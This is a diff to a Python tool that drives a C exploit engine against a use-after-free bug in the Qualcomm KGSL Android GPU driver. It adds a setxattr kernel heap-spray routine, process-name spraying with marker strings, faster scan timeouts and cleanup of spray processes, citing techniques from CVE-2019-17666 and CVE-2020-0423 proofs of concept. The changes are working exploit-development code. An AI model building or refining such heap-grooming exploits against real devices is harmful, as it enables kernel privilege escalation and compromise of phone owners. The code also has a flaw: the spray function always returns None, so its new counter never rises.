@@ -133,6 +133,13 @@ class MemoryExplorerAI:
         # before cmd_learning_start is called.
         self._learn_subworkers = []
         self.stats_lock = threading.Lock()
+        # learn_stats initialized eagerly so cmd_learning_start can
+        # access fields (xattrs_set etc.) before _learning_worker runs.
+        self.learn_stats = {
+            "batches": 0, "matches": 0, "verified": 0,
+            "false_positives": 0, "sprayed_total": 0,
+            "xattrs_set": 0,
+        }
         # Per-worker spray PID sets. KEY FIX: previously all 3 subworkers
         # shared one global list self.spray_procs, so when worker A hit
         # its RAM>70% threshold it would wipe worker B's and C's spray
@@ -820,9 +827,16 @@ class MemoryExplorerAI:
             if L["spray_target"] > 0:
                 pct = min(100, 100 * L["spray_count"] // max(1, L["spray_target"]))
                 bar = self._bar(pct, 32, C.CYN)
+                # Show kills ratio prominently. If >80% kills, paint
+                # red — that's the symptom of spray procs not
+                # surviving long enough to land in KGSL.
+                total_sprayed = max(1, L["spray_count"])
+                kill_ratio = 100.0 * L["kill_count"] / total_sprayed
+                kill_col = (C.RED if kill_ratio > 80 else
+                            C.YEL if kill_ratio > 50 else C.GRY)
                 out.append(f" {C.BOLD}SPRAY {C.RST}{spray_p} {bar} {pct:3d}%  "
                            f"({L['spray_count']}/{L['spray_target']})  "
-                           f"{C.GRY}kills:{L['kill_count']}{C.RST}")
+                           f"kills:{kill_col}{L['kill_count']}{C.RST}({kill_ratio:.0f}%)")
             if L["scan_total"] > 0:
                 pct = min(100, 100 * L["scan_offset"] // max(1, L["scan_total"]))
                 bar = self._bar(pct, 32, C.YEL)
@@ -859,6 +873,7 @@ class MemoryExplorerAI:
         out.append(f" {C.BOLD}AI{C.RST}: "
                    f"batches={C.CYN}{n_batches}{C.RST} "
                    f"sprayed={C.CYN}{n_sprayed}{C.RST} "
+                   f"xattr={C.MAG}{ls.get('xattrs_set', 0)}{C.RST} "
                    f"matches={C.YEL}{n_matches}{C.RST} "
                    f"verified={C.GRN}{n_verified}{C.RST} "
                    f"falsePos={C.RED}{n_fp}{C.RST} "
@@ -1116,6 +1131,10 @@ class MemoryExplorerAI:
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE, text=False, bufsize=0,
                 )
+                # Update the live status so the TUI header shows the
+                # real engine PID (was staying at 0 after a rebuild).
+                with self.stats_lock:
+                    self.live["engine_pid"] = self.exploit_proc.pid
                 self.live["last_msg"] = f"Engine started (pid={self.exploit_proc.pid})"
                 self.log_event("engine_start", {"pid": self.exploit_proc.pid})
                 return True
@@ -1626,6 +1645,56 @@ class MemoryExplorerAI:
             libc.prctl(PR_SET_NAME, name.encode(), 0, 0, 0)
         except Exception:
             pass
+
+    def _setxattr_spray(self, marker):
+        """Spray a kernel slab xattr with `marker` as the value.
+
+        The kernel allocates ~kvmalloc-sized buffers for xattr values;
+        these can land in the same physical pages KGSL UAF reads.
+        We create a tiny file in $TMPDIR and add an xattr named
+        "user.kgslspray" with value = marker. The kernel copies the
+        value into its own slab object — that slab object is what
+        the UAF can read back as KETO*/KETW* bytes.
+
+        The C engine's sig 1c/1d matches KETO+4digits / KETW+digits
+        in raw bytes, regardless of whether they came from a
+        task_struct comm or a slab xattr value. So this works.
+        """
+        import os as _os
+        import ctypes
+        import tempfile
+        # Lazy import of libc for setxattr syscall
+        try:
+            libc = ctypes.CDLL(None)
+            SYS_setxattr = 188  # AArch64
+            SYS_lsetxattr = 189
+            SYS_fsetxattr = 190
+            # Path-based: setxattr(path, name, value, size, flags)
+            path = _os.path.join(tempfile.gettempdir(),
+                                 f".kgsl_spray_{_os.getpid()}_{marker}")
+            try:
+                with open(path, "wb") as _f:
+                    _f.write(b"\x00" * 64)
+            except Exception:
+                return
+            val = marker.encode() + b"\x00" * 8
+            # 5th arg is flags (0 = XATTR_CREATE)
+            try:
+                libc.syscall(SYS_setxattr, path.encode(),
+                             b"user.kgslspray", val, len(val), 0)
+            except Exception:
+                try:
+                    libc.syscall(SYS_lsetxattr, path.encode(),
+                                 b"user.kgslspray", val, len(val), 0)
+                except Exception:
+                    pass
+            try:
+                _os.unlink(path)
+            except Exception:
+                pass
+        except Exception:
+            pass
+        return None
 
     def _readline_timeout(self, timeout=2.0):
         """Non-blocking-ish read of one line from the engine (with select timeout).
@@ -2373,12 +2442,17 @@ class MemoryExplorerAI:
         # Reset per-worker PID map BEFORE launching workers so stale
         # PIDs from a previous run don't linger in the new sets.
         self.spray_procs_by_worker = {}
+        # Reset comm mismatch warning so first batch of new run
+        # re-checks /proc/PID/comm.
+        self._comm_warned = False
+        # Reset xattr counter for new run
+        self.learn_stats["xattrs_set"] = 0
         self.cancel_flag.clear()
         self.bg_thread = threading.Thread(target=self._learning_worker, daemon=True)
         self.bg_thread.start()
         self.live["last_msg"] = (
             f"Learning started ({LEARN_WORKERS} parallel workers, "
-            f"batch=35). Press Ctrl+P to cancel.")
+            f"batch=20 + setxattr). Press Ctrl+P to cancel.")
         self.log_event("learning_start",
                        {"total_target": 1000, "batch": 35,
                         "workers": LEARN_WORKERS})
@@ -2406,6 +2480,7 @@ class MemoryExplorerAI:
         self.learn_stats = {
             "batches": 0, "matches": 0, "verified": 0,
             "false_positives": 0, "sprayed_total": 0,
+            "xattrs_set": 0,
         }
         # Lock for shared stats \u2014 multiple subworkers bump these
         self.stats_lock = threading.Lock()
@@ -2472,15 +2547,19 @@ class MemoryExplorerAI:
         one worker's RAM>70% cull wiped every other worker's spray set.
         """
         import subprocess as _sp
-        # Smaller batch (was 100). With 3 workers × 100 procs each, we
-        # had ~300 sleep procs alive concurrently which pushed RAM over
-        # 70% and triggered the cull path. 35 per worker × 3 = ~105 max
-        # alive, well under the threshold.
-        batch = 35
+        # Even smaller batch (was 35, then 100). With 3 workers × 35
+        # procs × ~10 batches we accumulated 1000+ PIDs that never
+        # died (kill failed silently), exhausting RAM and process
+        # table. 20 procs × 3 workers × multiple batches stays under
+        # 200 alive at any moment.
+        batch = 20
         done = slice_start
         # Per-worker PID set — isolated from siblings.
         my_pids = set()
         self.spray_procs_by_worker[worker_id] = my_pids
+        # Per-batch warning flag so we only complain about a comm
+        # mismatch once per worker (not on every spray).
+        self._comm_warned = False
         # Scan range for this subworker
         scan_chunk = (self.scan_size) // LEARN_WORKERS
         scan_start = self.uaf_start + scan_chunk * worker_id
@@ -2518,15 +2597,22 @@ class MemoryExplorerAI:
                 if idx >= slice_end:
                     break
                 try:
-                    # Marker encodes the subworker id (W0..W2) + 4-digit
-                    # index so we can tell which subworker sprayed which
-                    # process if we want to debug later. KETW + 3 digits
-                    # = 7 chars; fits in 8-byte spray comm. We also
-                    # spray some KETO04NN markers because the C engine's
-                    # sig-1 (task_struct KETO0422 detection) is tuned to
-                    # that family, so the scan picks them up reliably.
-                    # KETW gives us per-worker attribution; KETO gives us
-                    # max scan hit-rate.
+                    # Spray strategy: TWO complementary techniques per
+                    # process. This dramatically increases the chance
+                    # that some sprayed memory lands in KGSL UAF range.
+                    #
+                    # (a) Process spray — fork a sleep process with
+                    #     comm = "KETO0422"/"KETW0NNN". Catches the
+                    #     "task_struct ends up in KGSL memory" path.
+                    #
+                    # (b) setxattr spray — create a temp file and add
+                    #     an xattr with the same marker. On 5.4, the
+                    #     xattr slab (kvmalloc area) can land in the
+                    #     same physical pages as KGSL UAF. This is
+                    #     what CVE-2019-17666/CVE-2020-0423 POCs use.
+                    #     The xattr VALUE is the marker, the kernel
+                    #     copies it to its own slab object — that
+                    #     slab object is what the UAF can read.
                     spray_idx = idx
                     # Alternate KETO / KETW so we get both kinds of hits
                     if spray_idx % 2 == 0:
@@ -2538,15 +2624,42 @@ class MemoryExplorerAI:
                         stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                         preexec_fn=lambda n=name: self._set_comm(n),
                     )
+                    # setxattr spray on the same marker. Catches
+                    # heap-only UAF where task_struct doesn't make
+                    # it but slab xattr values do.
+                    try:
+                        if self._setxattr_spray(name):
+                            with self.stats_lock:
+                                self.learn_stats["xattrs_set"] = \
+                                    self.learn_stats.get("xattrs_set", 0) + 1
+                    except Exception:
+                        pass
                     batch_pids.append(p.pid)
                     my_pids.add(p.pid)  # per-worker set, NOT global
                     with self.stats_lock:
                         self.learn_stats["sprayed_total"] += 1
+                    # Verify comm is actually set. Without this, even
+                    # if popen succeeded, prctl() may have silently
+                    # failed (e.g. SELinux denial, kernel comm is 16
+                    # bytes and we passed >16) → comm = "sh" → scan
+                    # can never find our marker. We only log the
+                    # first failure per batch to avoid spam.
+                    if i == 0 or i == batch - 1:
+                        try:
+                            with open(f"/proc/{p.pid}/comm", "r") as cf:
+                                actual = cf.read().strip()
+                            if actual != name and not self._comm_warned:
+                                with self.stats_lock:
+                                    self.live["last_msg"] = (
+                                        f"W{worker_id}: comm mismatch "
+                                        f"pid={p.pid} want='{name}' "
+                                        f"got='{actual}'")
+                                self._comm_warned = True
+                        except Exception:
+                            pass
                     self.log_event("spray", {"pid": p.pid, "name": name,
                                               "batch": done // batch,
                                               "worker": worker_id})
-                    # No sleep — popen is already async; serializing via
-                    # sleep just slows spray rate without helping scan.
                 except OSError as e:
                     self.log_event("spray_error", {"err": str(e), "w": worker_id})
                     break
@@ -2643,11 +2756,23 @@ class MemoryExplorerAI:
                     f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
                 self.log_event("learning_scan_error",
                                {"err": "engine write failed", "w": worker_id})
+                # Engine might be dead — try to restart it for the
+                # next iteration. Without this, we silently give up
+                # for the rest of the learning run.
+                with self.stats_lock:
+                    self.live["engine_pid"] = 0
+                time.sleep(0.5)
                 continue
 
             try:
                 scan_done = False
-                SCAN_TIMEOUT = 30.0
+                # Reduced from 30 → 10s. With 3 workers serializing
+                # on one engine, 30s per worker = 90s per round means
+                # each worker only finishes ~10 batches in 5min.
+                # 10s × 3 = 30s/round → ~60 batches per 5min. Way
+                # more learning cycles, and a stuck scan doesn't
+                # burn the whole window.
+                SCAN_TIMEOUT = 10.0
                 scan_deadline = time.time() + SCAN_TIMEOUT
                 no_progress_count = 0
                 while not scan_done and not self.cancel_flag.is_set():
@@ -2817,15 +2942,45 @@ class MemoryExplorerAI:
                 self.log_event("learning_scan_error",
                                {"err": str(e), "w": worker_id})
 
-            # 3) KILL this subworker's spray batch (free RAM)
+            # 3) KILL this subworker's spray batch (free RAM).
+            # KEY FIX: previously we did os.kill(pid, 9) but never
+            # verified the process actually died. PIDs accumulated
+            # across batches (315+385+334 = 1034 alive at one point)
+            # and the kill_count went up but PIDs stayed in my_pids.
+            # New approach: send SIGKILL, then poll /proc/PID/exists
+            # up to 3 times. If still alive after 3 retries, give up
+            # and drop from the set so we don't keep trying forever.
+            killed_this_batch = 0
             for pid in batch_pids:
-                try:
-                    os.kill(pid, 9)
-                    os.waitpid(pid, 0)
-                except Exception:
-                    pass
-                self.live["kill_count"] += 1
-            time.sleep(0.05)
+                died = False
+                for attempt in range(3):
+                    try:
+                        os.kill(pid, 9)
+                    except ProcessLookupError:
+                        died = True
+                        break
+                    except Exception:
+                        pass
+                    # Poll whether /proc/PID still exists
+                    try:
+                        os.kill(pid, 0)  # signal 0 = check existence
+                        time.sleep(0.02)
+                    except ProcessLookupError:
+                        died = True
+                        break
+                    except Exception:
+                        break
+                # Either way, drop from our set so the PIDs we can't
+                # kill don't accumulate.
+                my_pids.discard(pid)
+                if died:
+                    killed_this_batch += 1
+                with self.stats_lock:
+                    self.live["kill_count"] += 1
+            with self.stats_lock:
+                self.live["last_msg"] = (
+                    f"W{worker_id}: killed {killed_this_batch}/"
+                    f"{len(batch_pids)} sprays")
 
         self.log_event("learning_subworker_done",
                        {"worker": worker_id, "done": done,
